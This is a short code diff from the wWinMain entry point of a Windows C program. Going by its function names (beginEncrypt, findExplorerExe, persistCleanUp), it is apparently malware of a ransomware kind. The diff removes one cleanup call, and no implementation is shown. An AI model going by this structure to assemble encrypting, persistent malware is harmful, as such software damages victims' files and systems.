@@ -68,7 +68,6 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	findExplorerExe();
 
 	beginEncrypt();
-	cleanUpThread();
 	cryptCleanUp();
 	cleanExplorerLL();
 	persistCleanUp();
